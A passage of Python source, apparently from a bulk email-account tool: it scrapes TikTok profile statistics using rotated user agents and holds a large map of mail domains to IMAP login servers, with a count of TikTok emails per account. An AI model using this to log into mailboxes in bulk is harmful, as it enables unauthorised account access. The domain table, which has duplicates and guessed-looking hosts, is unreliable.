                "tiktok_emails": tiktok_count,
                "username": username,
                "followers": 0,
                "following": 0,
                "videos": 0,
                "likes": 0,
                "verified": False,
                "bio": "",
                "country": "",
                "private": False,
                "profile_pic": "",
                "created": "N/A",
            }

            # Method 1: TikTok API endpoint (most reliable for stats)
            try:
                api_url = f"https://www.tiktok.com/api/user/detail/?uniqueId={username}&secUid="
                api_headers = {
                    'user-agent': random.choice(USER_AGENTS_TIKTOK),
                    'accept': 'application/json, text/plain, */*',
                    'referer': f'https://www.tiktok.com/@{username}',
                    'accept-language': 'en-US,en;q=0.9',
                }
                api_resp = requests.get(api_url, headers=api_headers, timeout=5)
                if api_resp.status_code == 200:
                    api_data = api_resp.json()
                    user_info = api_data.get('userInfo', {})
                    stats = user_info.get('stats', {})
                    usr = user_info.get('user', {})

                    if stats.get('followerCount', 0) > 0 or stats.get('videoCount', 0) > 0:
                        profile_data['followers'] = stats.get('followerCount', 0)
                        profile_data['following'] = stats.get('followingCount', 0)
                        profile_data['likes'] = stats.get('heartCount', 0)
                        profile_data['videos'] = stats.get('videoCount', 0)
                        profile_data['verified'] = usr.get('verified', False)
                        profile_data['bio'] = usr.get('signature', '') or ''
                        profile_data['country'] = usr.get('region', '') or ''
                        profile_data['private'] = usr.get('privateAccount', False)
                        profile_data['profile_pic'] = usr.get('avatarLarger', '') or usr.get('avatarThumb', '')
                        import datetime as _dt2
                        ct = usr.get('createTime', 0)
                        if ct:
                            try:
                                profile_data['created'] = _dt2.datetime.utcfromtimestamp(ct).strftime('%Y-%m-%d %H:%M:%S')
                            except:
                                pass
                        return profile_data
            except Exception as e:
                print(f"[TikTok] API method failed for {username}: {e}")

            # Method 2: Scrape HTML page as fallback
            try:
                headers_tiktok = {
                    'user-agent': random.choice(USER_AGENTS_TIKTOK),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'referer': 'https://www.tiktok.com/',
                }

                url = f"https://www.tiktok.com/@{username}"
                response = requests.get(url, headers=headers_tiktok, timeout=5, allow_redirects=True)

                if response.status_code == 200:
                    html = response.text

                    # Try SIGI_STATE JSON extraction
                    for script_id in ['__UNIVERSAL_DATA_FOR_REHYDRATION__', 'SIGI_STATE', '__NEXT_DATA__']:
                        json_pattern = rf'<script id="{script_id}"[^>]*>(.*?)</script>'
                        json_match = re.search(json_pattern, html, re.DOTALL)
                        if json_match:
                            try:
                                data = json.loads(json_match.group(1))

                                user_detail = None
                                if script_id == '__UNIVERSAL_DATA_FOR_REHYDRATION__':
                                    user_detail = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})
                                elif script_id == 'SIGI_STATE':
                                    user_module = data.get('UserModule', {})
                                    users_data = user_module.get('users', {})
                                    stats_data = user_module.get('stats', {})
                                    if username in users_data:
                                        user_detail = {
                                            'user': users_data[username],
                                            'stats': stats_data.get(username, {})
                                        }

                                if user_detail:
                                    usr = user_detail.get('user', {})
                                    stats = user_detail.get('stats', {})
                                    fc = stats.get('followerCount', 0)
                                    if fc > 0:
                                        profile_data['followers'] = fc
                                        profile_data['following'] = stats.get('followingCount', 0)
                                        profile_data['likes'] = stats.get('heartCount', 0)
                                        profile_data['videos'] = stats.get('videoCount', 0)
                                        profile_data['verified'] = usr.get('verified', False)
                                        return profile_data
                            except Exception:
                                pass

                    # Fallback: Regex extraction from raw HTML
                    followers_match = re.search(r'"followerCount":(\d+)', html)
                    if followers_match:
                        profile_data['followers'] = int(followers_match.group(1))
                    following_match = re.search(r'"followingCount":(\d+)', html)
                    if following_match:
                        profile_data['following'] = int(following_match.group(1))
                    videos_match = re.search(r'"videoCount":(\d+)', html)
                    if videos_match:
                        profile_data['videos'] = int(videos_match.group(1))
                    likes_match = re.search(r'"heartCount":(\d+)', html)
                    if likes_match:
                        profile_data['likes'] = int(likes_match.group(1))
                    verified_match = re.search(r'"verified":(true|false)', html)
                    if verified_match:
                        profile_data['verified'] = verified_match.group(1) == 'true'

                    return profile_data
            except Exception as e:
                print(f"[TikTok] HTML scrape failed for {username}: {e}")

            # Return basic data if profile fetch fails
            return {
                "has_tiktok": True,
                "tiktok_emails": tiktok_count,
                "username": username,
                "followers": 0,
                "following": 0,
                "videos": 0,
                "likes": 0,
                "verified": False
            }

        except:
            return None


IMAP_DOMAINS = {
    # ── German Providers ────────────────────────────────────────────
    "t-online.de": "imap.t-online.de",
    "t-online.com": "imap.t-online.de",
    "freenet.de": "imap.freenet.de",
    "online.de": "imap.online.de",
    "arcor.de": "mail.arcor.de",
    "arcor-online.de": "mail.arcor.de",
    "arcormail.de": "mail.arcor.de",
    "web.de": "imap.web.de",
    "gmx.de": "imap.gmx.net",
    "gmx.net": "imap.gmx.net",
    "gmx.com": "imap.gmx.net",
    "gmx.at": "imap.gmx.net",
    "gmx.ch": "imap.gmx.net",
    "gmx.org": "imap.gmx.net",
    "gmx.info": "imap.gmx.net",
    "gmx.eu": "imap.gmx.net",
    "gmx.biz": "imap.gmx.net",
    "gmx.us": "imap.gmx.net",
    "gmx.co.uk": "imap.gmx.net",

    # ── Gmail / Google ───────────────────────────────────────────────
    "gmail.com": "imap.gmail.com",
    "googlemail.com": "imap.gmail.com",
    "google.com": "imap.gmail.com",

    # ── Yahoo! (all country-specific domains) ───────────────────────
    "yahoo.com": "imap.mail.yahoo.com",
    "yahoo.co.uk": "imap.mail.yahoo.com",
    "yahoo.co.jp": "imap.mail.yahoo.com",
    "yahoo.fr": "imap.mail.yahoo.com",
    "yahoo.de": "imap.mail.yahoo.com",
    "yahoo.es": "imap.mail.yahoo.com",
    "yahoo.it": "imap.mail.yahoo.com",
    "yahoo.com.au": "imap.mail.yahoo.com",
    "yahoo.com.br": "imap.mail.yahoo.com",
    "yahoo.com.ar": "imap.mail.yahoo.com",
    "yahoo.com.mx": "imap.mail.yahoo.com",
    "yahoo.com.ph": "imap.mail.yahoo.com",
    "yahoo.com.sg": "imap.mail.yahoo.com",
    "yahoo.com.hk": "imap.mail.yahoo.com",
    "yahoo.ca": "imap.mail.yahoo.com",
    "yahoo.gr": "imap.mail.yahoo.com",
    "yahoo.dk": "imap.mail.yahoo.com",
    "yahoo.no": "imap.mail.yahoo.com",
    "yahoo.se": "imap.mail.yahoo.com",
    "yahoo.fi": "imap.mail.yahoo.com",
    "yahoo.at": "imap.mail.yahoo.com",
    "yahoo.be": "imap.mail.yahoo.com",
    "yahoo.nl": "imap.mail.yahoo.com",
    "yahoo.pl": "imap.mail.yahoo.com",
    "yahoo.pt": "imap.mail.yahoo.com",
    "yahoo.ro": "imap.mail.yahoo.com",
    "yahoo.hu": "imap.mail.yahoo.com",
    "yahoo.sk": "imap.mail.yahoo.com",
    "yahoo.co.id": "imap.mail.yahoo.com",
    "yahoo.co.in": "imap.mail.yahoo.com",
    "yahoo.co.nz": "imap.mail.yahoo.com",
    "yahoo.co.za": "imap.mail.yahoo.com",
    "yahoo.com.co": "imap.mail.yahoo.com",
    "yahoo.com.pe": "imap.mail.yahoo.com",
    "yahoo.com.tw": "imap.mail.yahoo.com",
    "yahoo.com.vn": "imap.mail.yahoo.com",
    "yahoo.ie": "imap.mail.yahoo.com",
    "yahoo.lt": "imap.mail.yahoo.com",
    "yahoo.lv": "imap.mail.yahoo.com",
    "yahoo.ee": "imap.mail.yahoo.com",
    "yahoo.com.ve": "imap.mail.yahoo.com",
    "yahoo.in": "imap.mail.yahoo.com",
    "yahoo.bg": "imap.mail.yahoo.com",
    "yahoo.hr": "imap.mail.yahoo.com",
    "yahoo.rs": "imap.mail.yahoo.com",
    "yahoo.mk": "imap.mail.yahoo.com",
    "yahoo.si": "imap.mail.yahoo.com",
    "yahoo.me": "imap.mail.yahoo.com",
    "yahoo.com.eg": "imap.mail.yahoo.com",
    "yahoo.com.ma": "imap.mail.yahoo.com",
    "yahoo.com.tn": "imap.mail.yahoo.com",
    "yahoo.com.ng": "imap.mail.yahoo.com",
    "yahoo.com.gh": "imap.mail.yahoo.com",
    "yahoo.com.pk": "imap.mail.yahoo.com",
    "yahoo.com.my": "imap.mail.yahoo.com",
    "yahoo.com.kh": "imap.mail.yahoo.com",
    "yahoo.co.il": "imap.mail.yahoo.com",
    "yahoo.co.th": "imap.mail.yahoo.com",
    "yahoo.cn": "imap.mail.yahoo.com",
    "yahoo.co.kr": "imap.mail.yahoo.com",
    "yahoo.co.uk": "imap.mail.yahoo.com",
    "ymail.com": "imap.mail.yahoo.com",
    "rocketmail.com": "imap.mail.yahoo.com",
    "myyahoo.com": "imap.mail.yahoo.com",

    # ── AOL / Verizon Media ─────────────────────────────────────────
    "aol.com": "imap.aol.com",
    "aol.co.uk": "imap.aol.com",
    "aol.fr": "imap.aol.com",
    "aol.de": "imap.aol.com",
    "aol.it": "imap.aol.com",
    "aol.es": "imap.aol.com",
    "aol.nl": "imap.aol.com",
    "aol.be": "imap.aol.com",
    "aol.at": "imap.aol.com",
    "aol.jp": "imap.aol.com",
    "aol.ca": "imap.aol.com",
    "aim.com": "imap.aol.com",
    "love.com": "imap.aol.com",
    "games.com": "imap.aol.com",
    "wow.com": "imap.aol.com",
    "ygm.com": "imap.aol.com",
    "netscape.net": "imap.aol.com",
    "compuserve.com": "imap.aol.com",

    # ── Apple iCloud ────────────────────────────────────────────────
    "icloud.com": "imap.mail.me.com",
    "me.com": "imap.mail.me.com",
    "mac.com": "imap.mail.me.com",

    # ── Zoho Mail ───────────────────────────────────────────────────
    "zoho.com": "imap.zoho.com",
    "zoho.in": "imap.zoho.in",
    "zoho.eu": "imap.zoho.eu",
    "zohomail.com": "imap.zoho.com",
    "zohocorp.com": "imap.zoho.com",

    # ── Yandex ──────────────────────────────────────────────────────
    "yandex.ru": "imap.yandex.com",
    "yandex.com": "imap.yandex.com",
    "ya.ru": "imap.yandex.com",
    "yandex.kz": "imap.yandex.com",
    "yandex.by": "imap.yandex.com",
    "yandex.com.tr": "imap.yandex.com",
    "yandex.ua": "imap.yandex.com",
    "yandex.md": "imap.yandex.com",
    "yandex.uz": "imap.yandex.com",
    "yandex.az": "imap.yandex.com",
    "yandex.kg": "imap.yandex.com",
    "yandex.tj": "imap.yandex.com",
    "yandex.tm": "imap.yandex.com",
    "narod.ru": "imap.yandex.com",

    # ── Mail.ru Group ───────────────────────────────────────────────
    "mail.ru": "imap.mail.ru",
    "inbox.ru": "imap.mail.ru",
    "bk.ru": "imap.mail.ru",
    "list.ru": "imap.mail.ru",
    "internet.ru": "imap.mail.ru",
    "mail.ua": "imap.mail.ru",
    "ro.ru": "imap.mail.ru",
    "myrambler.ru": "imap.mail.ru",

    # ── Rambler ─────────────────────────────────────────────────────
    "rambler.ru": "imap.rambler.ru",
    "autorambler.ru": "imap.rambler.ru",
    "lenta.ru": "imap.rambler.ru",

    # ── US ISP Providers ────────────────────────────────────────────
    "comcast.net": "imap.comcast.net",
    "xfinity.com": "imap.comcast.net",
    "att.net": "imap.mail.att.net",
    "sbcglobal.net": "imap.mail.att.net",
    "bellsouth.net": "imap.mail.att.net",
    "ameritech.net": "imap.mail.att.net",
    "pacbell.net": "imap.mail.att.net",
    "nvbell.net": "imap.mail.att.net",
    "snet.net": "imap.mail.att.net",
    "swbell.net": "imap.mail.att.net",
    "flash.net": "imap.mail.att.net",
    "worldnet.att.net": "imap.mail.att.net",
    "verizon.net": "incoming.verizon.net",
    "cox.net": "imap.cox.net",
    "cox.com": "imap.cox.net",
    "earthlink.net": "imap.earthlink.net",
    "mindspring.com": "imap.earthlink.net",
    "charter.net": "imap.mail.charter.net",
    "rr.com": "imap.mail.charter.net",
    "twc.com": "imap.mail.charter.net",
    "roadrunner.com": "imap.mail.charter.net",
    "tampabay.rr.com": "imap.mail.charter.net",
    "wi.rr.com": "imap.mail.charter.net",
    "carolina.rr.com": "imap.mail.charter.net",
    "neo.rr.com": "imap.mail.charter.net",
    "bak.rr.com": "imap.mail.charter.net",
    "juno.com": "imap.juno.com",
    "netzero.net": "imap.netzero.net",
    "netzero.com": "imap.netzero.net",
    "inbox.com": "imap.inbox.com",
    "prodigy.net": "imap.prodigy.net",
    "optonline.net": "mail.optonline.net",
    "centurylink.net": "imap.centurylink.net",
    "qwest.net": "imap.centurylink.net",
    "windstream.net": "imap.windstream.net",
    "consolidated.net": "mail.consolidated.net",
    "embarqmail.com": "imap.embarqmail.com",
    "frontier.com": "imap.frontier.com",
    "myfrontier.net": "imap.frontier.com",
    "frontiernet.net": "imap.frontier.com",
    "hughes.net": "imap.hughes.net",
    "dishmail.net": "imap.dishmail.net",

    # ── UK Providers ─────────────────────────────────────────────────
    "btinternet.com": "imap.btinternet.com",
    "btopenworld.com": "imap.btinternet.com",
    "bt.com": "imap.btinternet.com",
    "sky.com": "imap.sky.com",
    "skyone.co.uk": "imap.sky.com",
    "virginmedia.com": "imap.virginmedia.com",
    "virgin.net": "imap.virginmedia.com",
    "ntlworld.com": "imap.ntlworld.com",
    "talktalk.net": "imap.talktalk.net",
    "talk21.com": "imap.talktalk.net",
    "talktalk.co.uk": "imap.talktalk.net",
    "f2s.com": "imap.talktalk.net",
    "onetel.com": "imap.onetel.com",
    "tiscali.co.uk": "imap.tiscali.co.uk",
    "pipex.com": "imap.pipex.com",
    "clara.co.uk": "imap.clara.net",
    "lineone.net": "imap.lineone.net",
    "demon.co.uk": "imap.demon.co.uk",
    "freeserve.co.uk": "imap.freeserve.co.uk",
    "madasafish.com": "imap.madasafish.com",
    "supanet.com": "imap.supanet.com",
    "waitrose.com": "imap.waitrose.com",
    "easynet.co.uk": "imap.easynet.co.uk",

    # ── Swiss / Austrian / Liechtenstein ────────────────────────────
    "bluewin.ch": "imap.bluewin.ch",
    "hispeed.ch": "imap.bluewin.ch",
    "vtxmail.ch": "imap.vtx.ch",
    "swissonline.ch": "imap.swissonline.ch",
    "deckpoint.ch": "imap.deckpoint.ch",
    "nexion.ch": "imap.nexion.ch",

    # ── French Providers ─────────────────────────────────────────────
    "laposte.net": "imap.laposte.net",
    "sfr.fr": "imap.sfr.fr",
    "bbox.fr": "imap.sfr.fr",
    "neuf.fr": "imap.sfr.fr",
    "club-internet.fr": "imap.sfr.fr",
    "libertysurf.fr": "imap.sfr.fr",
    "noos.fr": "imap.sfr.fr",
    "tele2.fr": "imap.sfr.fr",
    "cegetel.net": "imap.sfr.fr",
    "free.fr": "imap.free.fr",
    "wanadoo.fr": "imap.wanadoo.fr",
    "orange.fr": "imap.orange.fr",
    "numericable.fr": "imap.numericable.fr",
    "alice.fr": "imap.alice.fr",
    "9online.fr": "imap.9online.fr",
    "fnac.net": "imap.fnac.net",
    "voila.fr": "imap.voila.fr",
    "caramail.com": "imap.caramail.com",

    # ── Spanish Providers ────────────────────────────────────────────
    "orange.es": "imap.orange.es",
    "ya.com": "imap.ya.com",
    "terra.es": "imap.terra.es",
    "wanadoo.es": "imap.wanadoo.es",
    "movistar.es": "imap.movistar.es",
    "telefonica.net": "imap.movistar.es",
    "ono.com": "imap.ono.com",
    "jazztelia.com": "imap.jazztelia.com",

    # ── Portuguese Providers ─────────────────────────────────────────
    "sapo.pt": "imap.sapo.pt",
    "netcabo.pt": "imap.netcabo.pt",
    "mail.pt": "imap.mail.pt",
    "clix.pt": "imap.clix.pt",
    "iol.pt": "imap.iol.pt",
    "oniduo.pt": "imap.oniduo.pt",

    # ── Italian Providers ────────────────────────────────────────────
    "libero.it": "imap.libero.it",
    "virgilio.it": "imap.virgilio.it",
    "alice.it": "imap.alice.it",
    "tin.it": "imap.tin.it",
    "tiscali.it": "imap.tiscali.it",
    "inwind.it": "imap.inwind.it",
    "iol.it": "imap.iol.it",
    "email.it": "imap.email.it",
    "kataweb.it": "imap.kataweb.it",
    "poste.it": "imap.poste.it",
    "fastwebnet.it": "imap.fastwebnet.it",
    "ngi.it": "imap.ngi.it",

    # ── Belgian / Dutch Providers ────────────────────────────────────
    "orange.be": "imap.orange.be",
    "skynet.be": "imap.skynet.be",
    "telenet.be": "imap.telenet.be",
    "pandora.be": "imap.pandora.be",
    "proximus.be": "imap.proximus.be",
    "scarlet.be": "imap.scarlet.be",
    "belgacom.net": "imap.belgacom.net",
    "kpnmail.nl": "imap.kpnmail.nl",
    "planet.nl": "imap.planet.nl",
    "hetnet.nl": "imap.hetnet.nl",
    "tele2.nl": "imap.tele2.nl",
    "xs4all.nl": "imap.xs4all.nl",
    "chello.nl": "imap.chello.nl",
    "casema.nl": "imap.casema.nl",
    "ziggo.nl": "imap.ziggo.nl",
    "upcmail.nl": "imap.upcmail.nl",

    # ── Polish Providers ─────────────────────────────────────────────
    "wp.pl": "imap.wp.pl",
    "onet.pl": "imap.poczta.onet.pl",
    "onet.eu": "imap.poczta.onet.pl",
    "op.pl": "imap.poczta.onet.pl",
    "onet.com.pl": "imap.poczta.onet.pl",
    "interia.pl": "imap.poczta.interia.pl",
    "interia.eu": "imap.poczta.interia.pl",
    "o2.pl": "imap.o2.pl",
    "tlen.pl": "imap.tlen.pl",
    "poczta.fm": "imap.poczta.fm",
    "gazeta.pl": "imap.gazeta.pl",
    "vp.pl": "imap.vp.pl",
    "epf.pl": "imap.epf.pl",
    "autograf.pl": "imap.autograf.pl",

    # ── Czech / Slovak Providers ─────────────────────────────────────
    "seznam.cz": "imap.seznam.cz",
    "email.cz": "imap.seznam.cz",
    "post.cz": "imap.seznam.cz",
    "volny.cz": "imap.volny.cz",
    "atlas.cz": "imap.atlas.cz",
    "centrum.cz": "imap.centrum.cz",
    "centrum.sk": "imap.centrum.sk",
    "zoznam.sk": "imap.zoznam.sk",
    "atlas.sk": "imap.atlas.sk",
    "post.sk": "imap.post.sk",
    "azet.sk": "imap.azet.sk",
    "pobox.sk": "imap.pobox.sk",
    "stonline.sk": "imap.stonline.sk",

    # ── Hungarian Providers ──────────────────────────────────────────
    "t-email.hu": "imap.t-email.hu",
    "freemail.hu": "imap.freemail.hu",
    "citromail.hu": "imap.citromail.hu",
    "axelero.hu": "imap.axelero.hu",
    "chello.hu": "imap.chello.hu",
    "vnet.hu": "imap.vnet.hu",

    # ── Romanian Providers ───────────────────────────────────────────
    "yahoo.ro": "imap.mail.yahoo.com",
    "clicknet.ro": "imap.clicknet.ro",
    "rdsmail.ro": "imap.rdsmail.ro",
    "home.ro": "imap.home.ro",
    "rdsor.ro": "imap.rdsor.ro",
    "pcnet.ro": "imap.pcnet.ro",

    # ── Russian / CIS Providers ──────────────────────────────────────
    "mail.ua": "imap.mail.ru",
    "bigmir.net": "imap.bigmir.net",
    "meta.ua": "imap.meta.ua",
    "ukr.net": "imap.ukr.net",
    "i.ua": "imap.i.ua",

    # ── Asian Providers ──────────────────────────────────────────────
    "naver.com": "imap.naver.com",
    "daum.net": "imap.daum.net",
    "hanmail.net": "imap.daum.net",
    "nate.com": "imap.mail.nate.com",
    "korea.com": "imap.korea.com",
    "nifty.com": "imap.nifty.com",
    "nifty.ne.jp": "imap.nifty.com",
    "ocn.ne.jp": "imap.ocn.ne.jp",
    "so-net.ne.jp": "imap.so-net.ne.jp",
    "biglobe.ne.jp": "imap.biglobe.ne.jp",
    "excite.co.jp": "imap.excite.co.jp",
    "docomo.ne.jp": "imap.docomo.ne.jp",
    "softbank.ne.jp": "imap.softbank.ne.jp",
    "au.com": "imap.ezweb.ne.jp",
    "hotmail.co.jp": "imap-mail.outlook.com",
    "live.jp": "imap-mail.outlook.com",
    "rediffmail.com": "imap.rediffmail.com",
    "sify.com": "imap.sify.com",
    "indiatimes.com": "imap.indiatimes.com",
    "123india.com": "imap.123india.com",
    "sing.com.sg": "imap.sing.com.sg",
    "pacific.net.sg": "imap.pacific.net.sg",
    "starhub.net.sg": "imap.starhub.net.sg",
    "tm.net.my": "imap.tm.net.my",
    "maxis.net.my": "imap.maxis.net.my",
    "streamyx.com": "imap.streamyx.com",
    "163.com": "imap.163.com",
    "126.com": "imap.126.com",
    "yeah.net": "imap.yeah.net",
    "sina.com": "imap.sina.com",
    "sina.cn": "imap.sina.com",
    "qq.com": "imap.qq.com",
    "vip.qq.com": "imap.qq.com",
    "foxmail.com": "imap.qq.com",
    "sohu.com": "imap.sohu.com",

    # ── Canadian Providers ────────────────────────────────────────────
    "rogers.com": "imap.rogers.com",
    "shaw.ca": "imap.shaw.ca",
    "telus.net": "imap.telus.net",
    "telusplanet.net": "imap.telus.net",
    "sympatico.ca": "imap.sympatico.ca",
    "bell.net": "imap.bell.net",
    "bellaliant.net": "imap.bell.net",
    "eastlink.ca": "imap.eastlink.ca",
    "sasktel.net": "imap.sasktel.net",
    "mts.net": "imap.mts.net",
    "videotron.ca": "imap.videotron.ca",

    # ── Australian Providers ──────────────────────────────────────────
    "bigpond.com": "mail.bigpond.com",
    "bigpond.net.au": "mail.bigpond.com",
    "telstra.com": "mail.bigpond.com",
    "optusnet.com.au": "mail.optusnet.com.au",
    "iinet.net.au": "imap.iinet.net.au",
    "tpg.com.au": "mail.tpg.com.au",
    "internode.on.net": "imap.internode.on.net",
    "primus.com.au": "imap.primus.com.au",
    "dodo.com.au": "imap.dodo.com.au",
    "aapt.net.au": "imap.aapt.net.au",
    "westnet.com.au": "imap.westnet.com.au",
    "adam.com.au": "imap.adam.com.au",

    # ── Brazilian Providers ───────────────────────────────────────────
    "bol.com.br": "imap.bol.com.br",
    "ig.com.br": "imap.ig.com.br",
    "terra.com.br": "imap.terra.com.br",
    "uol.com.br": "imap.uol.com.br",
    "globo.com": "imap.globomail.com",
    "globomail.com": "imap.globomail.com",
    "r7.com": "imap.r7.com",
    "oi.com.br": "imap.oi.com.br",
    "netcombr.com": "imap.netcombr.com",
    "gvt.net.br": "imap.gvt.net.br",

    # ── Argentinian Providers ────────────────────────────────────────
    "fibertel.com.ar": "imap.fibertel.com.ar",
    "ciudad.com.ar": "imap.ciudad.com.ar",
    "arnet.com.ar": "imap.arnet.com.ar",
    "speedy.com.ar": "imap.speedy.com.ar",

    # ── Mexican Providers ─────────────────────────────────────────────
    "prodigy.net.mx": "imap.prodigy.net.mx",
    "telmex.com": "imap.telmex.com",
    "megared.net.mx": "imap.megared.net.mx",

    # ── Indian Providers ──────────────────────────────────────────────
    "rediffmail.com": "imap.rediffmail.com",
    "sify.com": "imap.sify.com",
    "bsnl.in": "imap.bsnl.in",
    "mtnl.net": "imap.mtnl.net",
    "vsnl.net": "imap.vsnl.net",
    "airtelmail.in": "imap.airtelmail.in",
    "dataone.in": "imap.dataone.in",
    "india.com": "imap.india.com",
    "in.com": "imap.in.com",

    # ── Middle East / Israel ─────────────────────────────────────────
    "walla.co.il": "imap.walla.co.il",
    "walla.com": "imap.walla.co.il",
    "netvision.net.il": "imap.netvision.net.il",
    "zahav.net.il": "imap.zahav.net.il",
    "012.net.il": "imap.012.net.il",
    "bezeqint.net": "imap.bezeqint.net",
    "inter.net.il": "imap.inter.net.il",
    "hotmail.co.il": "imap-mail.outlook.com",

    # ── South African Providers ──────────────────────────────────────
    "mweb.co.za": "imap.mweb.co.za",
    "telkomsa.net": "imap.telkomsa.net",
    "vodamail.co.za": "imap.vodamail.co.za",

    # ── Scandinavian Providers ───────────────────────────────────────
    "telia.com": "imap.telia.com",
    "tele2.com": "imap.tele2.com",
    "bredband.net": "imap.bredband.net",
    "comhem.se": "imap.comhem.se",
    "bahnhof.se": "imap.bahnhof.se",
    "telenor.no": "imap.telenor.no",
    "online.no": "imap.online.no",
    "start.no": "imap.start.no",
    "broadpark.no": "imap.broadpark.no",
    "c2i.net": "imap.c2i.net",
    "stofanet.dk": "imap.stofanet.dk",
    "tdcadsl.dk": "imap.tdcadsl.dk",
    "post.dk": "imap.post.dk",
    "jubii.dk": "imap.jubii.dk",
    "sonofon.dk": "imap.sonofon.dk",
    "mailme.dk": "imap.mailme.dk",
    "kolumbus.fi": "imap.kolumbus.fi",
    "suomi24.fi": "imap.suomi24.fi",
    "luukku.com": "imap.luukku.com",
    "mbnet.fi": "imap.mbnet.fi",

    # ── Eastern European Providers ───────────────────────────────────
    "abv.bg": "imap.abv.bg",
    "dir.bg": "imap.dir.bg",
    "mail.bg": "imap.mail.bg",
    "b-online.bg": "imap.b-online.bg",
    "net.hr": "imap.net.hr",
    "email.t-com.hr": "imap.t-com.hr",
    "yahoo.rs": "imap.mail.yahoo.com",
    "eunet.rs": "imap.eunet.rs",
    "sbb.rs": "imap.sbb.rs",
    "verat.net": "imap.verat.net",

    # ── FastMail (hundreds of legacy domains) ─────────────────────────
    "fastmail.com": "imap.fastmail.com",
    "fastmail.fm": "imap.fastmail.com",
    "fastmail.net": "imap.fastmail.com",
    "fastmail.org": "imap.fastmail.com",
    "fastmail.to": "imap.fastmail.com",
    "fastmail.cn": "imap.fastmail.com",
    "fastmail.es": "imap.fastmail.com",
    "fastmail.de": "imap.fastmail.com",
    "fastmail.in": "imap.fastmail.com",
    "fastmail.jp": "imap.fastmail.com",
    "fastmail.mx": "imap.fastmail.com",
    "fastmail.nl": "imap.fastmail.com",
    "fastmail.se": "imap.fastmail.com",
    "fastmail.us": "imap.fastmail.com",
    "fmailbox.com": "imap.fastmail.com",
    "fmgirl.com": "imap.fastmail.com",
    "fmguy.com": "imap.fastmail.com",
    "hailmail.net": "imap.fastmail.com",
    "inoutbox.com": "imap.fastmail.com",
    "letterboxes.org": "imap.fastmail.com",
    "mailandftp.com": "imap.fastmail.com",
    "mailbolt.com": "imap.fastmail.com",
    "mailc.net": "imap.fastmail.com",
    "mailcan.com": "imap.fastmail.com",
    "mailhaven.com": "imap.fastmail.com",
    "mailingaddress.org": "imap.fastmail.com",
    "mailite.com": "imap.fastmail.com",
    "mailsent.net": "imap.fastmail.com",
    "mailservice.ms": "imap.fastmail.com",
    "mailvault.com": "imap.fastmail.com",
    "mailworks.org": "imap.fastmail.com",
    "ml1.net": "imap.fastmail.com",
    "mm.st": "imap.fastmail.com",
    "myfastmail.com": "imap.fastmail.com",
    "proinbox.com": "imap.fastmail.com",
    "promessage.com": "imap.fastmail.com",
    "realemail.net": "imap.fastmail.com",
    "sent.as": "imap.fastmail.com",
    "speedymail.org": "imap.fastmail.com",
    "swift-mail.com": "imap.fastmail.com",
    "the-fastest.net": "imap.fastmail.com",
    "the-quickest.com": "imap.fastmail.com",
    "xsmail.com": "imap.fastmail.com",
    "yepmail.net": "imap.fastmail.com",
    "fast-email.com": "imap.fastmail.com",
    "fast-mail.org": "imap.fastmail.com",

    # ── Privacy / Secure Mail Providers ─────────────────────────────
    "protonmail.com": "mail.protonmail.ch",
    "protonmail.ch": "mail.protonmail.ch",
    "proton.me": "mail.protonmail.ch",
    "pm.me": "mail.protonmail.ch",
    "posteo.de": "posteo.de",
    "posteo.net": "posteo.de",
    "posteo.org": "posteo.de",
    "posteo.at": "posteo.de",
    "posteo.ch": "posteo.de",
    "posteo.eu": "posteo.de",
    "mailbox.org": "imap.mailbox.org",
    "runbox.com": "mail.runbox.com",
    "hushmail.com": "imap.hushmail.com",
    "hush.com": "imap.hushmail.com",
    "hush.ai": "imap.hushmail.com",
    "mac.hush.com": "imap.hushmail.com",
    "startmail.com": "imap.startmail.com",
    "mailfence.com": "imap.mailfence.com",
    "disroot.org": "disroot.org",
    "riseup.net": "mail.riseup.net",
    "autistici.org": "imap.autistici.org",
    "kolabnow.com": "imap.kolabnow.com",
    "kolab.org": "imap.kolabnow.com",
    "countermail.com": "imap.countermail.com",
    "tutanota.com": "mail.tutanota.com",
    "tutanota.de": "mail.tutanota.com",
    "tutamail.com": "mail.tutanota.com",
    "tuta.io": "mail.tutanota.com",

    # ── Greek Providers ──────────────────────────────────────────────
    "in.gr": "imap.in.gr",
    "otenet.gr": "imap.otenet.gr",
    "forthnet.gr": "imap.forthnet.gr",
    "hol.gr": "imap.hol.gr",
    "ath.forthnet.gr": "imap.ath.forthnet.gr",

    # ── Turkish Providers ─────────────────────────────────────────────
    "turk.net": "imap.turk.net",
    "ttmail.com": "imap.ttmail.com",
    "superonline.net": "imap.superonline.net",
    "bursanet.com": "imap.bursanet.com",

    # ── African Providers ────────────────────────────────────────────
    "mweb.co.za": "imap.mweb.co.za",
    "webmail.co.za": "imap.webmail.co.za",
    "iafrica.com": "imap.iafrica.com",
    "cybersmart.co.za": "imap.cybersmart.co.za",
    "webmail.co.ke": "imap.webmail.co.ke",
    "saol.com": "imap.saol.com",

    # ── Latin American Providers ─────────────────────────────────────
    "cantv.net": "imap.cantv.net",
    "tsj.gov.ve": "imap.tsj.gov.ve",
    "etecsa.cu": "imap.etecsa.cu",
    "nauta.cu": "imap.nauta.cu",
    "hotmail.com.co": "imap-mail.outlook.com",
    "email.com": "imap.email.com",
    "firstlast.com": "imap.firstlast.com",

    # ── Miscellaneous Global Providers ──────────────────────────────
    "gmailmail.com": "imap.gmail.com",
    "iname.com": "imap.iname.com",
    "net-c.com": "imap.net-c.com",
    "net-c.fr": "imap.net-c.com",
    "net-c.ca": "imap.net-c.com",
    "net-c.nl": "imap.net-c.com",
    "net-c.it": "imap.net-c.com",
    "net-c.es": "imap.net-c.com",
    "net-c.de": "imap.net-c.com",
    "net-c.at": "imap.net-c.com",
    "net-c.be": "imap.net-c.com",
    "net-c.eu": "imap.net-c.com",
    "usa.net": "imap.usa.net",
    "consultant.com": "imap.usa.net",
    "engineer.com": "imap.usa.net",
    "geologist.com": "imap.usa.net",
    "techie.com": "imap.usa.net",
    "writeme.com": "imap.usa.net",
    "yours.com": "imap.usa.net",
    "cyberjunkie.com": "imap.usa.net",
    "myself.com": "imap.usa.net",
    "cheerful.com": "imap.usa.net",
    "eml.cc": "imap.eml.cc",
    "null.net": "imap.null.net",
    "laposte.net": "imap.laposte.net",
    "neuf.fr": "imap.neuf.fr",
    "liveinternet.ru": "imap.liveinternet.ru",
    "mymailbox.ru": "imap.mymailbox.ru",
